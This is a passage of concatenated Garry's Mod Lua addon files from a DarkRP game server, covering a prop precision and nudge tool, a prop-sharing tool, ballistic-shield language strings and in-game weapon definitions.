		if da < tol && da > -tol && db < tol && db > -tol && dc < tol && dc > -tol then
			return true
		else
			return false
		end
	end
end

if ( SERVER ) then
	
	function GetAllEnts( Ent, OrderedEntList, EntsTab, ConstsTab )
		if ( Ent and Ent:IsValid() ) and ( !EntsTab[ Ent:EntIndex() ] ) then
			EntsTab[ Ent:EntIndex() ] = Ent
			table.insert(OrderedEntList, Ent)
			if ( !constraint.HasConstraints( Ent ) ) then return OrderedEntList end
			for key, ConstraintEntity in pairs( Ent.Constraints ) do
				if ( !ConstsTab[ ConstraintEntity ] ) then
					ConstsTab[ ConstraintEntity ] = true
					local ConstTable = ConstraintEntity:GetTable()
					for i=1, 6 do
						local e = ConstTable[ "Ent"..i ]
						if ( e and e:IsValid() ) and ( !EntsTab[ e:EntIndex() ] ) then
							GetAllEnts( e, OrderedEntList, EntsTab, ConstsTab )
						end
					end
				end
			end
		end
		return OrderedEntList
	end
	
	function GetAllConstraints( EntsTab )
		local ConstsTab = {}
		for key, Ent in pairs( EntsTab ) do
			if ( Ent and Ent:IsValid() ) then
				local MyTable = constraint.GetTable( Ent )
				for key, Constraint in pairs( MyTable ) do
					if ( !ConstsTab[ Constraint.Constraint ] ) then
						ConstsTab[ Constraint.Constraint ] = Constraint
					end
				end
			end
		end
		return ConstsTab
	end
end

function TOOL:UpdateCustomGhost( ghost, player, offset )
	
	// Ghost is identically buggy to that of easyweld...  welding two frozen props and two unfrozen props yields different ghosts even if identical allignment

	if (ghost == nil) then return end
	if (!ghost:IsValid()) then ghost = nil return end

	local tr = util.GetPlayerTrace( player, player:GetAimVector() )
	local trace = util.TraceLine( tr )
	if (!trace.Hit) then return end

	local Ang1, Ang2 = self:GetNormal(1):Angle(), (trace.HitNormal * -1):Angle()
	local TargetAngle = self:GetEnt(1):AlignAngles( Ang1, Ang2 )

	self.GhostEntity:SetPos( self:GetEnt(1):GetPos() )
	
	if self:GetClientNumber( "autorotate" ) == 1 then
		TargetAngle.p = (math.Round(TargetAngle.p/45))*45
		TargetAngle.r = (math.Round(TargetAngle.r/45))*45
		TargetAngle.y = (math.Round(TargetAngle.y/45))*45
	end
	self.GhostEntity:SetAngles( TargetAngle )

	local TraceNormal = trace.HitNormal

	local offsetpercent		= self:GetClientNumber( "offsetpercent" ) == 1
	local NewOffset = offset
	if ( offsetpercent ) then
		local glower = trace.Entity:OBBMins()
		local gupper = trace.Entity:OBBMaxs()
		local height = math.abs(gupper.z - glower.z) -0.5
		if self:WithinABit(TraceNormal,trace.Entity:GetForward()) then
			height = math.abs(gupper.x - glower.x) -0.5
		elseif self:WithinABit(TraceNormal,trace.Entity:GetRight()) then
			height = math.abs(gupper.y - glower.y) -0.5
		end
		NewOffset = NewOffset / 100
		NewOffset = NewOffset * height
	end

	local TranslatedPos = ghost:LocalToWorld( self:GetLocalPos(1) )
	local TargetPos = trace.HitPos + (self:GetEnt(1):GetPos() - TranslatedPos) + (TraceNormal*NewOffset)

	self.GhostEntity:SetPos( TargetPos )
end


function TOOL:Think()
	//if CLIENT then return end
	local pl = self:GetOwner()
	local wep = pl:GetActiveWeapon()
	if not wep:IsValid() or wep:GetClass() != "gmod_tool" or pl:GetInfo("gmod_toolmode") != "precision" then return end
		
	if (self:NumObjects() < 1) then return end
	local Ent1 = self:GetEnt(1)
	if ( SERVER ) then
		if ( !Ent1:IsValid() ) then
			self:ClearObjects()
			return
		end
	end
	local mode = self:GetClientNumber( "mode" )

	if self:NumObjects() == 1 && mode != 2 then
		if ( (self:GetClientNumber( "move" ) == 1 && mode >= 3) || mode == 3 ) then
			if ( mode <= 8 ) then//no move = no ghost in parent mode
				local offset = math.Clamp( self:GetClientNumber( "offset" ), -5000, 5000 )
				self:UpdateCustomGhost( self.GhostEntity, self:GetOwner(), offset )
			end
		end
	else
		local rotate = (self:GetClientNumber( "rotate" ) == 1 && mode != 1) || mode == 2
		if ( SERVER && rotate && mode <= 8 ) then
			local offset = math.Clamp( self:GetClientNumber( "offset" ), -5000, 5000 )

			local Phys1 = self:GetPhys(1)

			local cmd = self:GetOwner():GetCurrentCommand()

			local rotation		= self:GetClientNumber( "rotation" )
			if ( rotation < 0.02 ) then rotation = 0.02 end
			local degrees = cmd:GetMouseX() * 0.02

			local newdegrees = 0
			local changedegrees = 0

			local angle = 0
			if( self:GetOwner():KeyDown( IN_RELOAD ) ) then
				self.realdegreesY = self.realdegreesY + degrees
				newdegrees =  self.realdegreesY - ((self.realdegreesY + (rotation/2)) % rotation)
				changedegrees = self.lastdegreesY - newdegrees
				self.lastdegreesY = newdegrees
				angle = Phys1:RotateAroundAxis( self.axisY , changedegrees )
			elseif( self:GetOwner():KeyDown( IN_ATTACK2 ) ) then
				self.realdegreesZ = self.realdegreesZ + degrees
				newdegrees =  self.realdegreesZ - ((self.realdegreesZ + (rotation/2)) % rotation)
				changedegrees = self.lastdegreesZ - newdegrees
				self.lastdegreesZ = newdegrees
				angle = Phys1:RotateAroundAxis( self.axisZ , changedegrees )
			else
				self.realdegrees = self.realdegrees + degrees
				newdegrees =  self.realdegrees - ((self.realdegrees + (rotation/2)) % rotation)
				changedegrees = self.lastdegrees - newdegrees
				self.lastdegrees = newdegrees
				angle = Phys1:RotateAroundAxis( self.axis , changedegrees )
			end
			Phys1:SetAngles( angle )

			if ( ( self:GetClientNumber( "move" ) == 1 && mode >= 3) || mode == 3 ) then
				local WPos2 = self:GetPos(2)
				local Ent2 = self:GetEnt(2)
				// Move so spots join up
				local Norm2 = self:GetNormal(2)

				local NewOffset = offset
				local offsetpercent	= self:GetClientNumber( "offsetpercent" ) == 1
				if ( offsetpercent ) then
					local glower = Ent2:OBBMins()
					local gupper = Ent2:OBBMaxs()
					local height = math.abs(gupper.z - glower.z) -0.5
					if self:WithinABit(Norm2,Ent2:GetForward()) then
						height = math.abs(gupper.x - glower.x) -0.5
					elseif self:WithinABit(Norm2,Ent2:GetRight()) then
						height = math.abs(gupper.y - glower.y) -0.5
					end
					NewOffset = NewOffset / 100
					NewOffset = NewOffset * height
				end

				Norm2 = Norm2 * (-0.0625 + NewOffset)
				local TargetPos = Vector(0,0,0)
				if ( self:GetEnt(1) == self:GetEnt(2) ) then
	//////////////////////////////////////////
					TargetPos = SavedPos + (Phys1:GetPos() - self:GetPos(1)) + (Norm2)
				else
					TargetPos = WPos2 + (Phys1:GetPos() - self:GetPos(1)) + (Norm2)
				end
				Phys1:SetPos( TargetPos )
			else
				// Move so rotating on axis

				local TargetPos = (Phys1:GetPos() - self:GetPos(1)) + self.OldPos
				Phys1:SetPos( TargetPos )
			end
			Phys1:Wake()
		end
	end
end

function TOOL:Nudge( trace, direction )
	if (!trace.Entity:IsValid() || trace.Entity:IsPlayer() ) then return false end
	local Phys1 = trace.Entity:GetPhysicsObjectNum( trace.PhysicsBone )
	local offsetpercent		= self:GetClientNumber( "nudgepercent" ) == 1
	local offset		= self:GetClientNumber( "nudge", 100 )
	local max = 8192
	if ( offsetpercent != 1 ) then
		if ( offset > max ) then
			offset = max
		elseif ( offset < -max ) then
			offset = -max
		end
	end
	//if ( offset == 0 ) then offset = 1 end
	local NewOffset = offset
	if ( offsetpercent ) then
		local glower = trace.Entity:OBBMins()
		local gupper = trace.Entity:OBBMaxs()
		local height = math.abs(gupper.z - glower.z) -0.5
		if self:WithinABit(trace.HitNormal,trace.Entity:GetForward()) then
			height = math.abs(gupper.x - glower.x)-0.5
		elseif self:WithinABit(trace.HitNormal,trace.Entity:GetRight()) then
			height = math.abs(gupper.y - glower.y)-0.5
		end
		NewOffset = NewOffset / 100
		local cap = math.floor(max / height)//No more than max units.
		if ( NewOffset > cap ) then
			NewOffset = cap
		elseif ( NewOffset < -cap ) then
			NewOffset = -cap
		end
		NewOffset = NewOffset * height
	end

	if ( self:GetClientNumber( "entirecontrap" ) == 1 ) then
		local NumApp = 0
		local TargetEnts = {}
		local EntsTab = {}
		local ConstsTab = {}
		GetAllEnts(trace.Entity, TargetEnts, EntsTab, ConstsTab)
		for key,CurrentEnt in pairs(TargetEnts) do
			if ( CurrentEnt and CurrentEnt:IsValid() ) then
				local CurrentPhys = CurrentEnt:GetPhysicsObject()
				if ( CurrentPhys:IsValid() ) then

					/*if ( self:GetClientNumber( "nudgeundo" ) == 1 ) then
						local oldpos = CurrentPhys:GetPos()
						local function NudgeUndo( Undo, Entity, oldpos )
							if CurrentEnt:IsValid() then
								CurrentEnt:SetPos( oldpos )
							end
						end
						undo.Create("Nrecision Nudge")
							undo.SetPlayer(self:GetOwner())
							undo.AddFunction( NudgeUndo, CurrentEnt, oldpos )
						undo.Finish()
					end*/// todo: all in 1 undo for mass nudging

					local TargetPos = CurrentPhys:GetPos() + trace.HitNormal * NewOffset * direction
					CurrentPhys:SetPos( TargetPos )
					CurrentPhys:Wake()
					if (CurrentEnt:GetMoveType() == 0 ) then //phys disabled, so move manually
						CurrentEnt:SetPos( TargetPos )
					end

				end
			end
			NumApp = NumApp + 1
		end
		if ( direction == -1 ) then
			--self:SendMessage( NumApp .. " items pushed." )
		elseif ( direction == 1 ) then
			--self:SendMessage( NumApp .. " items pulled." )
		else
			--self:SendMessage( NumApp .. " items nudged." )
		end
	else
		if ( self:GetClientNumber( "nudgeundo" ) == 1 ) then
			local oldpos = Phys1:GetPos()
			local function NudgeUndo( Undo, Entity, oldpos )
				if trace.Entity:IsValid() then
					trace.Entity:SetPos( oldpos )
				end
			end
			undo.Create("Precision PushPull")
				undo.SetPlayer(self:GetOwner())
				undo.AddFunction( NudgeUndo, trace.Entity, oldpos )
			undo.Finish()
		end
		local TargetPos = Phys1:GetPos() + trace.HitNormal * NewOffset * direction
		Phys1:SetPos( TargetPos )
		Phys1:Wake()
		local trent = trace.Entity
		local obbmins, obbmaxs = trent:LocalToWorld(trent:OBBMins()), trent:LocalToWorld(trent:OBBMaxs())
		for k, v in pairs(ents.FindInBox(obbmins, obbmaxs)) do
			if v:IsPlayer() or v:IsVehicle() then
				trent:SetCollisionGroup(20)
			end
		end
		if ( trace.Entity:GetMoveType() == 0 ) then
			trace.Entity:SetPos( TargetPos )
		end
		if ( direction == -1 ) then
			--self:SendMessage( "Сдвинуто." )
		elseif ( direction == 1 ) then
			--self:SendMessage( "target pulled." )
		else
			--self:SendMessage( "target nudged." )
		end
	end
	return true
end

function TOOL:RightClick( trace )
	local rotate = self:GetClientNumber( "rotate" ) == 1
	local mode = self:GetClientNumber( "mode" )
	if ( (mode == 2 && self:NumObjects() == 1) || (rotate && self:NumObjects() == 2 ) ) then
		if ( CLIENT ) then return false end
	else
		if ( CLIENT ) then return true end
		return self:Nudge( trace, -1 )
	end
end

function TOOL:Reload( trace )
	local rotate = self:GetClientNumber( "rotate" ) == 1
	local mode = self:GetClientNumber( "mode" )
	if ( (mode == 2 && self:NumObjects() == 1) || (rotate && self:NumObjects() == 2 ) ) then
		if ( CLIENT ) then return false end
	else
		if ( CLIENT ) then return true end
		return self:Nudge( trace, 1 )
	end
end

if CLIENT then

	

	local showgenmenu = 0//Seems to hide often, probably for the best

	local function AddDefControls( Panel )
		Panel:ClearControls()

		Panel:AddControl("ComboBox",
		{
			Label = "#Presets",
			MenuButton = 1,
			Folder = "precision",
			Options = {},
			CVars =
			{
				[0] = "precision_offset",
			}
		})

		//Panel:AddControl( "Label", { Text = "Secondary attack pushes, Reload pulls by this amount:", Description	= "Phx 1x is 47.45, Small tiled cube is 11.8625 and thin is 3 exact units" }  )
		Panel:AddControl( "Slider",  { Label	= "Расстояние",
					Type	= "Float",
					Min		= 1,
					Max		= 50,
					Command = "precision_nudge",
					Description = "Distance to push/pull props with altfire/reload"}	 ):SetDecimals( 4 )

		--local mode = LocalPlayer():GetInfoNum( "precision_mode", 0 )
		//Panel:AddControl( "Label", { Text = "Primary attack uses the tool's main mode.", Description	= "Select a mode and configure the options, be sure to try new things out!" }  )

		

		//17 per item + 16 for title
		
		if ( showgenmenu == 1 ) then
			Panel:AddControl( "Button", { Label = "\\/ General Tool Options \\/", Command = "precision_generalmenu", Description = "Collapse menu"  } )




		

		Panel:AddControl( "ListBox", params )

			//Panel:AddControl( "Label", { Text = "General Tool Options:", Description	= "Note: These don't save with presets." }  )
			Panel:AddControl( "Checkbox", { Label = "Enable tool feedback messages?", Command = "precision_enablefeedback", Description = "Toggle for feedback messages incase they get annoying"  } )
			Panel:AddControl( "Checkbox", { Label = "On = Feedback in Chat, Off = Centr Scrn", Command = "precision_chatfeedback", Description = "Chat too cluttered? Can have messages centre screen instead"  } )
			//Panel:AddControl( "Checkbox", { Label = "Hide Menu Tips?", Command = "precision_hidehints", Description = "Streamline the menu once you're happy with using the tool."  } )
			Panel:AddControl( "Checkbox", { Label = "Add Push/Pull to Undo List", Command = "precision_nudgeundo", Description = "For if you're in danger of nudging somthing to where you can't reach it"  } )
			Panel:AddControl( "Checkbox", { Label = "Add Movement to Undo List", Command = "precision_moveundo", Description = "So you don't have to secondary fire with nocollide to undo mistakes"  } )
			Panel:AddControl( "Checkbox", { Label = "Add Rotation to Undo List", Command = "precision_rotateundo", Description = "So you can find the exact rotation value easier"  } )
			Panel:AddControl( "Button", { Label = "Restore Current Mode Default", Command = "precision_defaultrestore", Description = "Collapse menu"  } )
		else
			
		end
	end



	local function precision_defaults()
		local mode = LocalPlayer():GetInfoNum( "precision_mode", 3 )
		if mode  == 1 then
			
		
			RunConsoleCommand("precision_allowphysgun", "0")
			RunConsoleCommand("precision_entirecontrap", "0")
		end
		precision_updatecpanel()
	end
	concommand.Add( "precision_defaultrestore", precision_defaults )

	
	

	function precision_setmode( player, tool, args )
		if LocalPlayer():GetInfoNum( "precision_mode", 3 ) != args[1] then
			RunConsoleCommand("precision_mode", args[1])
			timer.Simple(0.05, function() precision_updatecpanel() end ) 
		end
	end
	concommand.Add( "precision_setmode", precision_setmode )


	function precision_setuser( player, tool, args )
		if LocalPlayer():GetInfoNum( "precision_user", 3 ) != args[1] then
			RunConsoleCommand("precision_user", args[1])
			timer.Simple(0.05, function() precision_updatecpanel() end ) 
		end
	end
	concommand.Add( "precision_setuser", precision_setuser )


	function precision_updatecpanel()
		local Panel = controlpanel.Get( "precision" )
		if (!Panel) then return end
		//custom panel building ( wtf does Panel:AddDefaultControls() get it's defaults from? )
		AddDefControls( Panel )
	end
	concommand.Add( "precision_updatecpanel", precision_updatecpanel )

	function TOOL.BuildCPanel( Panel )
		AddDefControls( Panel )
	end

	local function precision_removalall()
		RunConsoleCommand("precision_removal_nocollide", "1")
		RunConsoleCommand("precision_removal_weld", "1")
		RunConsoleCommand("precision_removal_axis", "1")
		RunConsoleCommand("precision_removal_ballsocket", "1")
		RunConsoleCommand("precision_removal_advballsocket", "1")
		RunConsoleCommand("precision_removal_slider", "1")
		RunConsoleCommand("precision_removal_parent", "1")
		RunConsoleCommand("precision_removal_other", "1")
		precision_updatecpanel()
	end
	concommand.Add( "precision_removal_all", precision_removalall )
	local function precision_removalnone()
		RunConsoleCommand("precision_removal_nocollide", "0")
		RunConsoleCommand("precision_removal_weld", "0")
		RunConsoleCommand("precision_removal_axis", "0")
		RunConsoleCommand("precision_removal_ballsocket", "0")
		RunConsoleCommand("precision_removal_advballsocket", "0")
		RunConsoleCommand("precision_removal_slider", "0")
		RunConsoleCommand("precision_removal_parent", "0")
		RunConsoleCommand("precision_removal_other", "0")
		precision_updatecpanel()
	end
	concommand.Add( "precision_removal_none", precision_removalnone )

	function TOOL:FreezeMovement()
		local stage = self:GetStage()
		if ( stage == 2 ) then
			return true
		//elseif ( iNum > 0 && self:GetClientNumber("mode") == 2 ) then
		//	return true
		end
		return false
	end
end

function TOOL:Holster()
	self:ClearObjects()
	self:SetStage(0)
	self:ClearSelection()
end
--PATH gamemodes/darkrp/entities/weapons/gmod_tool/stools/shareprops.lua:
TOOL.Category           = "Основное"
TOOL.Name               = "Сохранение пропов"
TOOL.Command            = nil
TOOL.ConfigName         = ""

function TOOL:RightClick(trace)
    local ent = trace.Entity
    if not IsValid(ent) or CLIENT then return true end

    ent.SharePhysgun1 = nil
    ent.ShareGravgun1 = nil
    ent.SharePlayerUse1 = nil
    ent.ShareEntityDamage1 = nil
    ent.ShareToolgun1 = nil

    ent.AllowedPlayers = nil
    return true
end

function TOOL:LeftClick(trace)
    local ent = trace.Entity
    if not IsValid(ent) or CLIENT then return true end

    local ply = self:GetOwner()

    local Physgun = ent.SharePhysgun1 or false
    local GravGun = ent.ShareGravgun1 or false
    local PlayerUse = ent.SharePlayerUse1 or false
    local Damage = ent.ShareEntityDamage1 or false
    local Toolgun = ent.ShareToolgun1 or false

    -- This big usermessage will be too big if you select 63 players, since that will not happen I can't be arsed to solve it
    umsg.Start("FPP_ShareSettings", ply)
        umsg.Entity(ent)
        umsg.Bool(Physgun)
        umsg.Bool(GravGun)
        umsg.Bool(PlayerUse)
        umsg.Bool(Damage)
        umsg.Bool(Toolgun)
        if ent.AllowedPlayers then
            umsg.Long(#ent.AllowedPlayers)
            for k,v in pairs(ent.AllowedPlayers) do
                umsg.Entity(v)
            end
        end
    umsg.End()
    return true
end

if CLIENT then
    language.Add( "Tool.shareprops.name", "Share tool" )
    language.Add( "Tool.shareprops.desc", "Change sharing settings per prop" )
    language.Add( "Tool.shareprops.0", "Left click: shares a prop. Right click unshares a prop")
end

--PATH addons/cp_ballistic_shields/lua/ballistic_shields/sh_bs_lang.lua:
include( "ballistic_shields/sh_bs_util.lua" )

bshields.lang = {
	["English"] = {
		["sec"] = "[ПКМ] Видимость",
		["dshieldprim"] = "[ЛКМ] Применить",
		["hshieldprim"] = "[ЛКМ] Сломать дверь",
		["rshieldprim"] = "[ЛКМ] Атака",
		["hshieldcd1"] = "Подождите ",
		["hshieldcd2"] = " секунд что-бы сломать дверь!"	
	},
	["German"] = {
		["sec"] = "[RMB] SICHTBARKEIT",
		["dshieldprim"] = "[LMB] PLAZIEREN",
		["hshieldprim"] = "[LMB] TÜR AUFBRECHEN",
		["rshieldprim"] = "[LMB] ANGREIFEN",
		["hshieldcd1"] = "Warte ",
		["hshieldcd2"] = " Sekunden für das Aufbrechen der nächsten Tür!"	
	},
	["French"] = {
		["sec"] = "[RMB] VISIBILITÉ",
		["dshieldprim"] = "[LMB] DÉPLOYER",
		["hshieldprim"] = "[LMB] FORCER LA PORTE",
		["rshieldprim"] = "[LMB] ATTAQUER",
		["hshieldcd1"] = "Attendez ",
		["hshieldcd2"] = " secondes pour forcer la porte !"	
	},
	["Danish"] = {
		["sec"] = "[RMB] SIGTBARHED",
		["dshieldprim"] = "[LMB] SÆT",
		["hshieldprim"] = "[LMB] BREACH DØR",
		["rshieldprim"] = "[LMB] ANGRIB",
		["hshieldcd1"] = "Vent ",
		["hshieldcd2"] = " sekunder at bryde ved siden af!"   
	},
	["Turkish"] = {
		["sec"] = "[RMB] GORUNURLUK",
		["dshieldprim"] = "[LMB] YERLESTIR",
		["hshieldprim"] = "[LMB] BREACH DOOR",
		["rshieldprim"] = "[LMB] SALDIR",
		["hshieldcd1"] = "Bekle ",
		["hshieldcd2"] = " bir sonraki kapıyı kırmaya saniye kaldı!"   
	}
}  

if(bshields.lang[bshields.config.language]==nil) then bshields.config.language = "English" end
--PATH addons/cp_ballistic_shields/lua/ballistic_shields/sh_bs_util.lua:
bshields = bshields or {}
bshields.config = bshields.config or {}

bshields.shields = {
	{
		[1] = {
			["angles"] = Angle(4,6,-14),
			["position"] = Vector(0,8,-1)
		},
		[2] = {
			["angles"] = Angle(6,6,-12),
			["position"] = Vector(8,10,-4)
		},
		[3] = {
			["angles"] = Angle(-3,7,-16),
			["position"] = Vector(-1,4,-3)
		}
	},
	{
		[1] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(6,-4,-8)
		},
		[2] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(16,-3,-12)
		},
		[3] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(6,-3,-12)
		}
	},
	{
		[1] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-7,-13)
		},
		[2] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-6,-22)
		},
		[3] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-8,-12)
		}
	}
}

--PATH addons/weaponandcontent/lua/weapons/m3super90/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "M3Super90"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(2.686, 0, 1.08)
	SWEP.AimAng = Vector(0.428, 0, 0)
		
	SWEP.SprintPos = Vector(-3.701, -7.639, 0.236)
	SWEP.SprintAng = Vector(-9.646, -65.866, 0)
	
	SWEP.ZoomAmount = 5
	SWEP.ViewModelMovementScale = 0.85
	SWEP.Shell = "shotshell"
	SWEP.ShellOnEvent = true
	
	SWEP.IconLetter = "k"
	--killicon.AddFont("swb_m3super90", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_pistol_med"
end

SWEP.CanPenetrate = false
SWEP.PlayBackRate = 1
SWEP.PlayBackRateSV = 1
SWEP.SpeedDec = 30
SWEP.BulletDiameter = 5
SWEP.CaseLength = 10

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true
SWEP.AmmoEnt = "item_box_buckshot_ttt"

SWEP.Slot = 1
SWEP.SlotPos = 0
SWEP.NormalHoldType = "shotgun"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"semi"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Base swb"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_shot_m3super90.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_shot_m3super90.mdl"	-- Weapon world model

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 8
SWEP.Primary.DefaultClip	= 8
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "buckshot"

SWEP.FireDelay = 1
SWEP.FireSound = Sound("Alt_Weapon_M3.1")	
SWEP.Recoil = 2.5
SWEP.ShotgunReload = true
SWEP.ReloadStartWait = 0.6
SWEP.ReloadFinishWait = 1.1
SWEP.ReloadShellInsertWait = 0.6
SWEP.Chamberable = false

SWEP.HipSpread = 0.036
SWEP.AimSpread = 0.003
SWEP.ClumpSpread = 0.01
SWEP.VelocitySensitivity = 2.2
SWEP.MaxSpreadInc = 0.06
SWEP.SpreadPerShot = 0.02
SWEP.SpreadCooldown = 1.03
SWEP.Shots = 9
SWEP.Damage = 12
SWEP.DeployTime = 1
--PATH addons/m9k/lua/weapons/m9k_browningauto5/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_browningauto5/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_browningauto5") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Shotguns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "Browning Auto 5"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 32			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "shotgun"	-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_brown_auto5.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_browning_auto.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_shotty_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Weapon_a5.Single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 250		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 6			-- Size of a clip
SWEP.Primary.DefaultClip		= 30	-- Default number of bullets in a clip
SWEP.Primary.KickUp				= 1				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.8		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.6	-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "Buckshot"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.ShellTime			= .35

SWEP.Primary.NumShots	= 9		//how many bullets to shoot, use with shotguns
SWEP.Primary.Damage		= 10	//base damage, scaled by game
SWEP.Primary.Spread		= .03	//define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .03 // has to be the same as primary.spread
-- Because irons don't magically give you less pellet spread!

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(1.953, 0, 1.388)
SWEP.IronSightsAng = Vector(0, 0, 0)
SWEP.SightsPos = Vector(1.953, 0, 1.388)
SWEP.SightsAng = Vector(0, 0, 0)
SWEP.RunSightsPos = Vector(-3.116, -3.935, 0.492)
SWEP.RunSightsAng = Vector(-19.894, -47.624, 10.902)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_honeybadger/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_honeybadger") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "AAC Honey Badger"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 43			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- Set false if you want no crosshair from hip
SWEP.Weight				= 50			-- Rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.XHair					= true		-- Used for returning crosshair after scope. Must be the same as DrawCrosshair
SWEP.BoltAction				= false		-- Is this a bolt action rifle?
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= false
SWEP.ViewModel				= "models/weapons/v_aacbadger.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_aac_honeybadger.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_scoped_base"
